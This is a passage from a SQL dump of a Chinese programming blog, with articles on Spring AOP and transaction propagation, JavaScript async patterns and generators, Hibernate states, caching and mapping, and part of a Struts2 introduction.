代理类的函数签名和原类一模一样,调用它后它会先开启事务然后调用实际类的方法,调用后再结束事务,做到了类似拦截器的效果\n\nAOP面向切面编程，所谓切面就是对一类重复业务的抽象，例如事务。\n本来事务的操作耦合在各个业务层代码中，不好统一管理\n我们就可以通过AOP将事务定义成一个切面，然后定义对应的通知与切点，这样事务的管理变得更加清晰，代码也变得更加优雅。\n\n// 核心是动态代理\n关于AOP的实现是基于动态代理,这个可以去网上找有关这方面的资料\nJava动态代理有两种实现\n1. JDK代理是利用*反射机制*生成一个实现代理接口的匿名类,在调用具体方法前调用invokeHandler来处理\n2. Cglib代理是利用*asm开源包*,将代理对象类的class文件加载进来,通过修改其字节码生成子类来处理\n\n```\n### 事务传播\n![Spring事务传播行为.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624594245_Spring-事务传播行为.png)\n```java\n如果说你加了一个@Transactional注解，此时就spring会使用AOP\n对你的这个方法在执行之前，先去开启事务，执行完毕之后，根据你方法是否报错，来决定回滚还是提交事务\n\n// 事务传播行为是什么\n事务的传播，就是是用于servcie层相互调用时，解决事务作用范围的一个机制\n比如说A和B两个方法\nA调用B,A与B要处于同一个事务，要提交一起提交,要回滚一起回滚。\nA调用B,A与B不能处于同一事务，A调用B结束后发生错误要回滚,B已经执行完提交了,B不需要回滚,它们两不需要同生共死\n\n// 有哪些事务传播行为\nPROPAGATION_REQUIRED：如果当前没有事务，就创建一个新事务，如果当前存在事务，就加入该事务，该设置是最常用的设置。\nPROPAGATION_SUPPORTS：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事务执行。‘\nPROPAGATION_MANDATORY：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就抛出异常。\nPROPAGATION_REQUIRES_NEW：创建新事务，无论当前存不存在事务，都创建新事务。\nPROPAGATION_NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。\nPROPAGATION_NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。\nPROPAGATION_NESTED：如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则按REQUIRED属性执行。\n\n具体的场景使用场景需要根据业务场景选择\n\n// 哪些情况下事务会没作用\n1. 没开启事务,没配置事务管理器,没被spring扫描到\n2. 方法加了@Transactional注解,但是这个方法不是public的,事务不会起作用\n3. 抛出的不是RuntimeException异常,而是普通的Exception,不会回滚\n4. 事务错误的时候,你自己在代码里try,把异常抓了,外面的spring接不到异常\n5. 同一个类中调用,如都在A类中,a1和a2两个方法,a1没事务注解被调用,然后a1调用同类有事务注解的a2,a2的事务会不启作用\n因为你直接走自己的方法是不会通过spring事务aop的\n\n\n```', 0, 0, 208, 0, 0, '2018-09-03 12:01:06', '2020-08-22 12:01:06', 0, 0);
INSERT INTO `article` VALUES (11, 1, 'JavaScript的回调函数与generator生成器', '2018/8/1533906679_209ca2fe2b07174d0ea9a6f928bc3aa7.jpg', '###  回调函数\n```java\n(1) Js的回调函数嵌套是一直以来的诟病,在复杂的nodeJs处理逻辑时，往往回调函数像搭楼层那么高，一望天际 \n(2) 为了解决这个问题，出现了许多的新方法来取代回调函数\n```\n#### 基本回调函数\n```java\n// 传统回调函数\n// 最开始的回调函数开始啦\nfunction fn(data,callback) {\n		let result = data + 1\n		callback(result)\n	}\n	function mh(data,callback) {\n		let result = data * 9\n		callback(result)\n	}\n	fn(1,(result)=>{\n		console.log(result)\n	})\n\n// 这是最简单的回调函数形式，学过js的都能看懂\n// 但当我们需要嵌套时就要命了\nfn(1,(result)=>{\n	mh(result,(result)=>{\n		fn(result,(result)=>{\n			mh(result,(result)=>{\n				console.log(result)\n			})		\n		})\n	})\n})\n\n// 可以看到随着嵌套的形式变多，代码样子开始往奇怪的方向发展了,\n// 因为这个问题出现了新的替代回调函数的方式\n```\n#### Promise\n```java\n// 先来一个简单的例子\n// promise是现在非常常用的方式，许多的框架和模块采用promise来取代回调函数嵌套的问题 \nfunction fn(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data + 1 \n		resolve(result)	\n	}\n}\nfunction mh(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data * 9\n		resolve(result)\n	})\n}\nfn(1).then((result)=>{\n	console.log(result)\n}).catch((result)=>{\n	console.log(result)\n})\n\n// 相比于传统回调,promise的回调结果在then方法中获取，如果调用reject则可以在catch方法中获取 \n// 现在来看看promise在嵌套的情况下\n\nfn(1).then((result)=>{\n	return mh(result)\n}).then((result)=>{\n	return fn(result)\n}).then((result)=>{\n	return mh(result)\n}).then((result)=>{\n	console.log(result)\n}).catch((result)=>{ \n	console.log(result)\n})\n\n// 可以看到Promise这种嵌套的代码样子比传统的回调函数要好看不少，最后的catch中可以进行统一处理被reject调用的结果,也可以在每个then中各追加一个catch处理\n```\n#### co+generator+Promise\n```javascript\n// co模块是一个非常强大的模块，使用异步的回调调用像同步代码一样的写法,解决了嵌套的麻烦   \n我们直接上例子\nconst co = require(\'co\')\nfunction fn(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data + 1\n		resolve(result)\n	})\n}\nfunction mh(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data * 9\n		resolve(result)\n	})\n}\nco(function *(){\n	var result = yield fn(1)\n	result = yield mh(result)\n	result = yield fn(result)\n	result = yield mh(result)\n	console.log(result)\n}).catch((result)=>{\n	console.log(result)\n})\n// 可以看到co模块使得异步回调的代码变得像同步代码一样编写，非常的强大 \n// 如果你对上面的generator函数不了解你可以搜索我的另一篇文章*理解generator生成器函数*\n```\n#### es7中的async+await\n```java\n// async异步函数是一个非常强大的特性,nodeJs的框架*koa2*就是采用的这种特性而开发的\n// 我们首先举个简单例子\nasync function afn(data) {\n	let result = data + 1\n	return result \n}\nafn(1).then((result)=>{\n	console.log(result)\n})\n\n// 可以看到异步函数返回时一个promise,我们应该在then中取结果而不是直接执行获得返回值\n// 下面看看es7的异步函数是如何解决异步嵌套调用问题的\nfunction fn(data) {\n	let result = data + 1\n	return result\n}\nfunction mh(data) {\n	return new Promise((resolve,reject)=>{\n		let result = data * 9\n		resolve(result)\n	})\n}\nasync function afn(data) {\n	let result = data * 50\n	return Promise.resolve(result)\n}\nasync function handler() {\n	let result = await fn(1)\n	result = await mh(result) \n	result = await afn(result) \n	console.log(result)\n	return result\n}\nhander().then((result)=>{\n	console.log(result)\n}).catch((result)=>{\n	console.log(result)\n})\n// 从上面代码可以看出es7的异步函数十分爽快,它的await关键字既可以等待普通函数的返回值也可以等待promise的返回值，而且它本身也是一个promise非常的灵活,注意只有异步函数才可以加await关键字\n```\n### generator生成器\n```java\n// generator生成器函数是es6中一个解决回调函数嵌套的特性，本文不深入理解特性实现\nfunction *fm(arr) {\n	for (let i = 0; i< arr.length; i++) {\n		yield arr[i]\n	}\n}\nconst gen = fm([\'S\',\'A\',\'B\'])\nconsole.log(gen.next().value)// S\nconsole.log(gen.next().value)// A\nconsole.log(gen.next().value)// B\nconsole.log(gen.next().done)// true\n\n// 上面的代码可能没有看懂,我们来详解\n// 我们把一个数字数组给了这个生成器函数\nconst gen = fm([\'S\',\'A\',\'B\'])\n// 然后我们调用next得到一个S，也就是我们第一个的值\nconsole.log(gen.next().value)\n// 然后我们继续调用next得到下一个值A\nconsole.log(gen.next().value)\n// 打印得到一个false,这说明这里面还有一个值B,如果没有值则会打印true\n// 我们可以根据done这个来判断里面还有没有值\nconsole.log(gen.next().done)\n\n// 可能上面还是看不懂或者并不知道这有什么用，让我们继续一个简单的例子\n// 这个*说明这是一个generator生成器函数，你可以在里面用yeild这个关键字\nfunction *d() {\n	yield \'S\'\n	yield \'A\'\n	yield \'C\'\n}\nconst dn = d()\nconsole.log(dn.next().value) // S\nconsole.log(dn.next().value) // A\nconsole.log(dn.next().value) // C\n\n// 硬编码调用\n// 你有没有发现什么，那个yeild关键字像不像是暂停键  \n我第一次yeild,它就走到了yield \'S\'，然后得到右边的值也就是S,然后它就停在那里了，等我调用下一次next()\n你可能会觉得这没有意义这里的S,A,C都是放好了的,还是没什么用\n\n// 赋值调用\n// 那么我们能不能手动扔值进去，当然可以\nfunction *f() {\n	var result = yield\n	result()\n}\nlet fn = f()\nfn.next() // 什么事都没有发生,value值是undefined,done是false\nfn.next(function(){ \n	// 这里被执行了\n	console.log(\'callback\')\n})\n\n(1) 当第一次调用next时，yield的右边是没有任何值的,但yeild并没有结束,它在等待新的next结束它这次yield,所以done是false\n(2) 当第二次调用next时,yield被唤醒了,它右边的值就是我们next()时传进去的回调函数,所以result得到了我们传进去的回调函数,随后它调用这个回调函数，于是打印了callback\n\n// 看到了这里你可能还是无法实际使用它,我们来一个实际的例子\n```\n#### 实际例子\n```javascript\nrun(function *(){\n	// axios是一个http请求的模块,返回的是一个promise\n	const res = yield axios.get(\'https://182.56.12.333/api/g\')\n	const data = yield res.data\n	console.log(data)// 返回结果 \n})\nfunction run(generator) {\n	const gn = generator()\n	const promise = gn.next().value // 第一个next传入参数没有意义\n	promise.then((res)=>{\n		let data = gn.next(res).value\n		console.log(gn.next(data).done)// true\n	})\n} \n\n// 上面的例子可能有点绕，如果可以看懂,说明对generator生成器函数有一个大致的理解\n```', 0, 0, 89, 0, 0, '2018-09-05 21:11:27', '2018-09-05 21:11:27', 0, 0);
INSERT INTO `article` VALUES (12, 1, 'hibernate的示例代码', '2021/5/1621413898_mmexport1621057567146.jpg', '### hibernate\n```java\nHibernate是一个具有典型代表的ORM框架(表达数据模型对象映射关系)。\nHibernate框架体系功能十分强大 级联操作和懒加载的特性非常具有代表性\n\n它自创了两种查询方式\n1. HQL: Hibernate称之为面向对象的查询语言,与数据表无关  \n2. Criteria: Hibernate自创查询,运用API进行数据库操作\n\n```\n### 对象状态\n![Hibernate对象状态.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626671577_Hibernate-对象状态.png)\n```java\n// Hibernate本质上操作的是持久化类的状态,而不是表面意义上的增删改查\n// 持久化数据模型对象在Hibernate中有三种状态\n1. 瞬时状态: 没有id,没有与session关联(没有在session缓存中) \n2. 持久化状态: 有id,与session有关联(在session缓存中)\n3. 游离|托管状态: 有id,没有与session关联(没有在session缓存中)\n\n// 持久化类创建注意事项\n持久化类提供无参数构造(Hibernate反射创建)\n成员变量私有提供setget方法(封装)\n持久化类中的属性,使用包装类型(Integer,Long)\n持久化类必须提供id,与数据库中主键列对应(hibernate区分对象是通过主键列id属性,而不是内存地址)\n不要用final修饰class(hibernate实现动态代理是使用cglib继承代理)\n```\n#### 例子\n```java \n	// 三种状态\n	// 瞬时,持久化,游离|托管\n	// 三种状态转换\n	// 三种状态特点\n	// 持久化状态特点: 持久化对象的任何变化都会自动同步到数据库中,实际上不用update.事务提交后会进行更新\n	@org.junit.Test\n	public void fun1(){\n		Configuration conf = new Configuration();\n		conf.configure();\n		SessionFactory sessionFactory = conf.buildSessionFactory();\n		Session session = sessionFactory.openSession();\n		Transaction tx = session.beginTransaction();\n		//----------------------------------------------\n		Customer customer = new Customer(); // 没有id,没有session关联 => 瞬时状态\n		customer.setCust_name(\"google公司\");	 // 瞬时状态,依旧没有id,但有名字属性\n		session.save(customer); // 有id,与session有关联 => 持久化状态\n		Customer dbCustomer = session.get(Customer.class, 1l); // 有id,与session有关联 => 持久化状态\n		dbCustomer.setCust_name(\"微软公司\");	// 有id,与session有关联 => 持久化状态,实际上不用调用update\n		//----------------------------------------------\n		tx.commit();\n		session.close(); // 有id,没有与session关联 => 游离|托管状态\n		sessionFactory.close();\n	}\n\n// Hibernate增删改查的本质就是对象状态转换\n1. save方法本质: 其实不能理解成保存.理解成将瞬时状态转换成持久状态的方法\n2. update方法本质: 其实不能理解成修改,理解成将游离状态转换成持久状态的方法\n3. delete方法本质: 其实不能理解成删除,理解成将持久状态转换成瞬时状态 \n4. get方法本质: 其实不能理解成查询,理解成直接获取持久状态\n5. session.close方法本质: 将session关联剔除,理解成将持久状态转换成游离状态\n6. saveOrUpdate方法本质: 其实不能理解成保存或修改,理解成将瞬时或游离状态转换成持久状态的方法\n```\n### 关系映射绑定\n#### 一对多\n```java\n// 一方Customer\nprivate Set<LinkMan> linkMans = new HashSet<LinkMan>();\n\n<!-- 一对多关系 \n	name: 引用属性名\n	column: 外键列名\n	class: 关联对象类名\n-->\n<!-- 级联操作: cascade \n	save-update: 级联保存更新\n	delete: 级联删除\n	all: save-upad+delete都启用\n	级联操作: 简化操作,语法糖,无需每个单个保存或删除\n-->\n<!-- \n	inverse属性: 配置关系是否维护\n	true: 不维护关系\n	false: 维护关系\n	性能优化提高关系维护性能.\n	一对多关系中: 由多的一方维护,外键字段就在多的一方的列\n--> \n<set name=\"linkMans\" inverse=\"true\" cascade=\"save-update\">\n	<!-- 外键名 -->\n	<key column=\"lkm_cust_id\"></key>\n	<!-- 一对多 多者类 -->\n	<one-to-many class=\"LinkMan\"/>\n</set> \n\n// 多方LinkMan\nprivate Customer customer ;\n\n<!--多对一关系  \n	name: 引用属性名\n	column: 外键列名		\n	class: 关联对象类名\n--> \n<!-- 级联操作: cascade \n	save-update: 级联保存更新\n	delete: 级联删除\n	all: save-upad+delete都启用\n	级联操作: 简化操作,语法糖,无需每个单个保存或删除\n-->\n<!-- 多的一方:不能放弃维护关系,外键字段就在多的一方的列 -->\n<many-to-one name=\"customer\" column=\"lkm_cust_id\" class=\"Customer\"/>\n```\n#### 多对多\n```java\n// 多对多关系,一定要选择一方放弃维护关系\n// 多方Role\nprivate Set<User> users = new HashSet<User>();\n\n<!-- 使用inverse属性\n	true: 放弃维护外键关系\n	false(默认值):维护关系\n	结论: 将来在开发中,如果遇到多对多关系.一定要选择一方放弃维护关系.\n	一般谁来放弃要看业务方向. 例如录入员工时,需要为员工指定所属角色.\n	 那么业务方向就是由员工维护角色. 角色不需要维护与员工关系.角色放弃维护\n-->\n<set name=\"users\" table=\"sys_user_role\" inverse=\"true\" >\n	<key column=\"role_id\" ></key>\n	<many-to-many class=\"User\" column=\"user_id\" ></many-to-many>\n</set>\n\n// 多方User\nprivate Set<Role> roles = new HashSet<Role>();\n\n<!-- 多对多关系表达\n	name: 引用属性名\n	column: 外键列名\n	class: 关联对象类名\n-->\n<!-- 级联操作: cascade \n	save-update: 级联保存更新\n	delete: 级联删除\n	all: save-upad+delete都启用\n	级联操作: 简化操作,语法糖,无需每个单个保存或删除\n-->\n<set name=\"roles\" table=\"sys_user_role\" cascade=\"save-update\" >\n	<key column=\"user_id\" ></key>\n	<many-to-many class=\"Role\" column=\"role_id\" ></many-to-many>\n</set>\n```\n### 缓存与快照\n```java\n// 缓存\n1. 从硬件CPU来讲,CPU有多级缓存,CPU需要多级缓存的原因是为了*缓解CPU和内存之间速度不匹配问题*(查看我的第22篇文章笔记)\n2. 从软件发起IO请求文件下载来看, 预加载,解决硬盘多次交互,*制造缓冲区*而不是1字节1字节的读取\n3. 从Redis中来看,是为了快速获取数据,减轻数据库压力\n4. 总之,都是为了*提高效率*\n\n// Hibernate缓存也是为了提高效率,提高操作数据库的效率\n```\n#### 一级缓存\n![Hibernate一级缓存.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626671577_Hibernate-一级缓存.png)\n```java\n	// 证明一级缓存存在\n	@org.junit.Test\n	public void fun1(){ \n		Configuration conf = new Configuration();\n		conf.configure();\n		SessionFactory sessionFactory = conf.buildSessionFactory();\n		Session session = sessionFactory.openSession();\n		Transaction tx = session.beginTransaction();\n		//----------------------------------------------\n		// 讲道理应该是打印五次SQL查询语句,但只打印了一次\n		Customer c1 = session.get(Customer.class, 1l);\n		Customer c2 = session.get(Customer.class, 1l);\n		Customer c3 = session.get(Customer.class, 1l);\n		Customer c4 = session.get(Customer.class, 1l);\n		Customer c5 = session.get(Customer.class, 1l);\n		System.out.println(c1==c2); // true\n		//----------------------------------------------\n		tx.commit();\n		session.close();\n		sessionFactory.close();\n	} \n\n// 5次得到Customer是同一个,也就是它被Hibernate的缓存装进去了。*调用get获取时得到对象是持久化状态,也就是被放入hibernate的session缓存中了*\n```\n#### 二级缓存\n```java\n// 二级缓存是在session缓存之上的缓存,也就是*sessionFactory级别*,也就是说*多个session可以读取一个全局缓存*,二级缓存默认hibernate是不开启的  \n// 只有很少被修改的数据,不会被并发访问的数据,常量数据适合放入二级缓存之中,*重要敏感数据*千万不要开启二级缓存,hibernate默认不开启二级缓存也是有道理的\n// Redis类的分布式缓存出现使得二级缓存无需使用\n```\n#### 快照\n![Hibernate数据快照.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626671577_Hibernate-数据快照.png)\n```java\n// 快照是用以*存储某一时间的状态*,就像云服务商服务器提供的快照一样,为了能在误操作的情况下回滚至之前的状态,你也可以理解为游戏中的存档大法\n// 证明快照存在\n	@org.junit.Test\n	public void fun2(){\n		Configuration conf = new Configuration();\n		conf.configure();\n		SessionFactory sessionFactory = conf.buildSessionFactory();\n		Session session = sessionFactory.openSession();\n		Transaction tx = session.beginTransaction();\n		//----------------------------------------------\n		// 假设数据库中原本id为1的cust_name就是阿里巴巴\n		// 最后改变依旧为阿里巴巴\n		// 不会打印执行update,因为hibernate发现CustName没有被修改,依旧是阿里巴巴\n		Customer c1 = session.get(Customer.class, 1l);\n		c1.setCust_name(\"百度\");\n		c1.setCust_name(\"腾讯\");\n		c1.setCust_name(\"阿里巴巴\");\n		//----------------------------------------------\n		tx.commit();\n		session.close();\n		sessionFactory.close();\n	}\n\n// 快照机制是用来比对的,*增加修改时的效率*,因为hibernate发现c1的cust_name取出来之前的cust_name就是阿里巴巴,尽管在修改三次后最后cust_name值依旧是阿里巴巴,事务提交时hibernate发现cust_name并没有改变,所以不会去执行update\n\n// #### 如果快照不存在,那么就会去update\n	// 如果快照不存在,那么就会去update\n	// 持久化状态对象其实就是放入session缓存中的对象\n	@org.junit.Test\n	public void fun3(){\n		Configuration conf = new Configuration();\n		conf.configure();\n		SessionFactory sessionFactory = conf.buildSessionFactory();\n		Session session = sessionFactory.openSession();\n		Transaction tx = session.beginTransaction();\n		//----------------------------------------------\n		Customer c1 = new Customer();\n		// 托管|游离.有id,没有与session关联(没有在session缓存中)\n		c1.setCust_id(1l); \n		// c1被放入session缓存了\n		session.update(c1); \n		// get会去从缓存中找,很明显上面把c1放入session变为持久化状态了\n		Customer c2 = session.get(Customer.class, 1l); \n		System.out.println(c1 == c2); // true\n		//----------------------------------------------\n		// 事务提交时,会比对缓存中的持久状态对象和快照\n		// 开始session缓存中没有快照,只有缓存中的c1缺少c1相关快照\n		// 根据c1的缓存,会执行一条update操作,对id=1的数据行进行修改\n		// 如果customer的数据表允许数据为空,那么事务提交后id为1的c1其他数据字段会被清空,因为执行了update\n		tx.commit(); \n		session.close();\n		sessionFactory.close();\n	} \n```\n### Hibernate事务\n```java\n// Hibernate如何管理事务\n1. 业务开始之前打开事务,业务执行之后提交事务,执行过程中出现异常,回滚事务\n2. 从数据层dao操作数据库需要用到session对象,在service控制事务也是使用session对象完成,\n	我们要确保dao层和service使用的是*同一个session*\n3. 在hibernate中,确保使用同一个session的问题,hibernate已经帮我们解决了(底层使用了线程封闭的ThreadLocal),开发人员只需要调用*sf.getCurrentSession()*方法即可获得与当前线程绑定的session对象\n4. 调用getCurrentSession方法必须配置主配置中的一个配置\n5. 通过getCurrentSession方法获得的session对象,当事务提交时,session会自动关闭,不要手动调用close关闭\n\n// 大规模并发中不会开启事务,因为严重影响性能,而是会选择做*补偿方案*\n\n// hibernate开启事务与ThreadLoacal的Session\n<property name=\"hibernate.connection.isolation\">4</property>\n<!-- 之所以以数字区分,是因为数据库直接以二进制区分事务等级 -->\n1: 0001 读未提交\n2: 0010 读已提交\n4: 0100 可重复读\n8: 1000 串行化\n<!-- 指定session与当前线程绑定 -->\n<property name=\"hibernate.current_session_context_class\">thread</property>\n```\n### 查询\n```java\n// HQL查询\n1. HibernateQueryLanguage\n2. hibernate独家查询语言,属于面向对象查询语言,对象查询,依靠对象属性进行多表查询\n3. HQL语句中,不可能出现任何数据库相关信息的\n4. 只可能出现对象名和属性名,支持问号占位符和命名占位符\n5. 多表查询但不复杂时使用\n\n// Criteria查询\n1. hibernate自创无语句面向对象查询\n2. 单表查询使用\n3. 传统criteria 由session创建,组装查询条件到Criteria执行查询\n4. 离线Criteria 不需要session凭空创建Criteria,组装查询条件\n\n// 原生SQL查询 \n1. 复杂的业务查询(十表关联报表的查询)\n2. 支持问号占位符和命名占位符\n\n// 懒加载策略\n1. 为了提高效率,fetch的选择上应该选择select,lazy的取值应选择true。全部使用默认值\n2. 懒加载后却未使用的情况下,会导致在页面上实现懒加载时的代理对象,被称为no-session问题,因为显示至页面后hibernate的session关闭了,而懒加载的数据期间没有被使用.解决方法是在filter放行后扩大session的作用范围,页面使用代理对象渲染后再关闭session\n\n// 类级别懒加载\nHibernate的load方法实现了懒加载,在使用时才进行查询  \n懒加载默认所有数据持久化类都是开启的\n<!-- lazy: load懒加载 -->\n<class name=\"Customer\" table=\"cst_customer\" lazy=\"ture\" >\n\n	// get方法: 立即加载,执行方法时立即发送sql语句查询结果\n	@org.junit.Test\n	public void fun1() {\n		Session session = HibernateUtils.getCurrentSession();\n		Transaction tx = session.beginTransaction();\n		//----------------------------------------------------\n		Customer c = session.get(Customer.class, 2l);\n		System.out.println(c);\n		//----------------------------------------------------\n		tx.commit();\n	}\n	\n	// load方法: 是在执行时,不发送任何sql语句,返回一个对象,使用该对象时,才执行查询\n	// 延迟加载:仅仅获得没有使用,不会查询,在使用时才进行查询\n	@org.junit.Test\n	public void fun2() {\n		Session session = HibernateUtils.getCurrentSession();\n		Transaction tx = session.beginTransaction();\n		//----------------------------------------------------\n		Customer c = session.load(Customer.class, 2l);\n		System.out.println(c);\n		//----------------------------------------------------\n		tx.commit();\n	}\n``` \n#### 关联级别懒加载和fetch\n```java\n// 集合级别,一方获取多方\n<set name=\"linkMens\" lazy=\"true\" fetch=\"select\" batch-size=\"3\"  >\n	<key column=\"lkm_cust_id\" ></key>\n	<one-to-many class=\"LinkMan\" />\n</set> \n\n<!-- lazy属性: 决定是否延迟加载 -->\ntrue(默认值): 延迟加载,懒加载 (是在执行时,不发送任何sql语句,返回一个代理对象,使用该对象时,运用session才执行查询,延迟加载(hibernate使用代理实现的))\nfalse: 立即加载\nextra: 极其懒惰,与懒加载基本一致,如果只获得集合size,只查询集合的size(count)语句\n\n<!-- fetch属性: 决定加载策略.使用什么类型的sql语句加载集合数据 -->\nselect(默认值): 单表查询加载\njoin: 使用多表查询加载集合\nsubselect:使用子查询加载集合\n两个属性可以组成九种组合,造成7种查询SQL结果,多表查询会导致懒加载失效 \n\n<!-- batch-size: 抓取集合的数量为3 -->\n抓取客户的集合时,一次抓取几个客户的联系人集合.\n\n// 关联级别,多方获取一方\n<many-to-one name=\"customer\" column=\"lkm_cust_id\" class=\"Customer\" fetch=\"join\" lazy=\"proxy\"  >\n</many-to-one> \n\n<!-- lazy  决定加载时机 -->\nfalse: 立即加载\nproxy: 由另一方的*类级别*加载策略决定\n\n<!-- fetch 决定加载的sql语句 -->\nselect: 使用单表查询\njoin : 多表查询\n```\n### 其他属性配置\n```java\n// 生成表结构 \n<property name=\"hibernate.hbm2ddl.auto\">update</property>\n1. create		自动建表.每次框架运行都会创建新的表.以前表将会被覆盖,表数据会丢失.(开发环境中测试使用)\n2. create-drop 自动建表.每次框架运行结束都会将所有表删除.(开发环境中测试使用)\n3. update(推荐使用) 自动生成表.如果已经存在不会再生成.如果表有变动.自动更新表(不会删除任何数据)\n4. validate	校验.不自动生成表.每次启动会校验数据库中表是否正确.校验失败 \n\n// 语句方言(Mysql)\n<property name=\"hibernate.dialect\">org.hibernate.dialect.MySQLDialect</property>\norg.hibernate.dialect.MySQLDialect 通用型(推荐)\norg.hibernate.dialect.MySQLInnoDBDialect	InnoDB引擎\norg.hibernate.dialect.MySQLMyISAMDialect	ISAMD引擎\n\n// 事务隔离级别\n<property name=\"hibernate.connection.isolation\">4</property>\n1: 0001 读未提交\n2: 0010 读已提交\n4: 0100 可重复读\n8: 1000 串行化\n\n// 开启线程级别session\n<property name=\"hibernate.current_session_context_class\">thread</property>\n\n// 自然主键和代理主键\n1. 自然主键(表的业务列中,有某业务列符合必须有,并且不重复的特征时(身份证号码),该列可以作为主键使用)\n2. 代理主键(表的业务列中,没有业务列符合必须有,并且不重复的特征时,创建一个没有业务意义的列,作为主键)\n\n// 主键生成策略\n<id name=\"cust_id\"  >\n	<!-- generator:主键生成策略 -->\n	<generator class=\"native\"></generator>\n</id>\nidentity 主键自增,由数据库维护主键值,录入时不需要指定主键id\nincrement(不用) 主键自增,由hibernate来维护,每次插入前先查询表中id最大值,+1作为新主键值(有线程安全问题)\nsequence: Oracle中的主键生成策略\nhilo(不用): 高低位算法.主键自增,由hibernate维护保证不重复\nnative: hilo+increment+identity,自动三选一策略\nuuid: 产生随机字符串作为主键,主键类型必须是string\nassigned: 自然主键生成策略,hibernate不会管理主键值,由开发人员自己录入\n\n// 级联操作\n<!-- 级联操作: cascade -->\n save-update: 级联保存更新\n delete: 级联删除\n all: save-upad+delete都启用\n 级联操作: 简化操作,语法糖,无需每个单个保存或删除\n\n// 配置关系是否维护\n<!-- 配置关系是否维护: inverse -->\n true: 不维护关系\n false: 维护关系\n 性能优化提高关系维护性能.\n 一对多关系中: 由多的一方维护,外键字段就在多的一方的列\n\n// 持久化类懒加载\n<!-- lazy: load懒加载 -->\n<class name=\"Customer\" table=\"cst_customer\" lazy=\"ture\" >\n\n// 关联级别懒加载-多方\n<!-- \nfetch 决定加载的sql语句\n	select: 使用单表查询\n	join : 多表查询\nlazy  决定加载时机\n	false: 立即加载\n	proxy: 由customer的类级别加载策略决定.\n--> \n<many-to-one name=\"customer\" column=\"lkm_cust_id\" class=\"Customer\" fetch=\"select\" lazy=\"proxy\"  >\n</many-to-one>\n\n// 关联级别懒加载-一方\n<!-- \nlazy属性: 决定是否延迟加载\n	true(默认值): 延迟加载,懒加载\n	false: 立即加载\n	extra: 极其懒惰\nfetch属性: 决定加载策略.使用什么类型的sql语句加载集合数据\n	select(默认值): 单表查询加载\n	join: 使用多表查询加载集合\n	subselect:使用子查询加载集合\nbatch-size属性: 抓取集合的数量为3.\n	抓取客户的集合时,一次抓取几个客户的联系人集合.\n -->  \n<set name=\"linkMens\" lazy=\"true\" fetch=\"select\" batch-size=\"3\"  >\n	<key column=\"lkm_cust_id\" ></key>\n	<one-to-many class=\"LinkMan\" />\n</set>\n```', 0, 0, 140, 0, 0, '2018-10-29 17:04:13', '2018-11-16 17:04:13', 0, 0);
INSERT INTO `article` VALUES (13, 1, 'struts2示例代码', '2021/5/1621415511_mmexport1621058994600.jpg', '### 基本概念\n```java\nStruts2是一个web控制接口层的应用框架,它的核心实现思想是*面向切面编程(AOP)*,其主要实现方式是通过*底层Filter过滤器*进行请求拦截框架处理,随后通过struts定义的*拦截器*对请求进行逐级处理,struts2的内置拦截器实现有将近40个  \nstruts2框架上是典型的*洋葱模型*实现的框架,源码很具有学习参考性,它的实现很像nodeJs的web框架koa2,内部的递归调用和拦截器功能的单一责任制非常具有源码学习性\nstruts2数据处理采用了*值栈结构*,非常的巧妙 \n```\n\n#### AOP\n![Struts2AOP.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626673405_Struts2-AOP.png)\n```java\n// AOP思想\n// 纵向重复代码,横向抽取\n1. 把重复的事情在一个地方完成\n2. 杜绝冗余性代码,组件化的道理,高复用的道理\n3. 便于维护完善升级\n\n// 体现场景\n1. 拦截器 \n2. 网关\n3. nginx\n4. 动态代理模式(*这个模式非常非常非常重要,优化代码,理解框架与造轮子非常有用*)\n\n```\n### 基本架构\n![Struts2基本架构.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626673405_Struts2-基本架构.png)\n```java\n红色: 自己配置\n绿色: 可默认可自定义\n\n// 主要流程\n1. ActionProxy读取开发者的配置文件\n2. 当请求过来时,ActionProxy根据配置数据规则交给ActionInvocation处理\n3. 经过一大串的拦截器处理,到达开发者编写的方法\n4. 根据开发者返回的结果进行页面跳转\n5. 期间会将请求的数据进行压栈\n6. 开发者编写的处理Action每次请求都会创建,struts2利用这点实现压栈数据线程安全\n\n```\n### ActionContext\n![Struts2ActionContext.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626673405_Struts2-ActionContext.png)\n```java\n// ActionContext包含以下对象\n// EL的11个内置对象\n1. pageScope: 获取jsp中pageContext域属性，相当于pageContext.getAttribute(\"xxx\"))\n2. requestScope: 获取request域属性 \n3. sessionScope: 获取session域属性\n4. applicationScope: 获取application域属性，相当于application.getAttribute(\"xxx\")\n5. param: 它是一个Map，其中key是参数，value是参数值，适用于单值的参数,相当于request.getParameter(\"xxx\")\n6. paramValues: 它是一个Map，其中key是参数，value是多个参数值，适用于多值的参数，相当request.getParameterValues(\"xxx\")\n7. header: 对应请求头，它是一个Map，其中key表示头名称，value是单个头值，适用于单值的请求头，相当于request.getHeader(\"xxx\")\n8. headerValues: 对应请求头，它是一个Map，其中key表示头名称，value是多个头值，适用于多值的请求头，相当于request.getHeaders(\"xxx\")\n9 initParam: 获取web.xml中<context-param>内的参数，${ initParam.xxx}，xxx就是<param-name>标签内的值，进而得到<param-value>中的值\n10 cookie: 用于获取cookie，Map<String,Cookie>，其中key是cookie的name，value是cookie对象，例如${cookie.JSESSIONID.value }就是获取sessionId \n11. pageContext: 可以获取JSP九大内置对象，相当于使用该对象调用getxxx()方法，例如pageContext.getRequest()可以写为${pageContext.request)\n\n// JSP的9个内置对象\n1. application: 主要用于保存用户信息，代码片段的运行环境,它是一个共享的内置对象，即一个容器中的多个用户共享一个application对象，故其保存的信息被所有用户所共享.\n2. session: 主要用于来分别保存每个用户信息，与请求关联的会话 \n3. request: 主要用于接受客户端通过HTTP协议连接传输到服务器端的数据\n4. response: 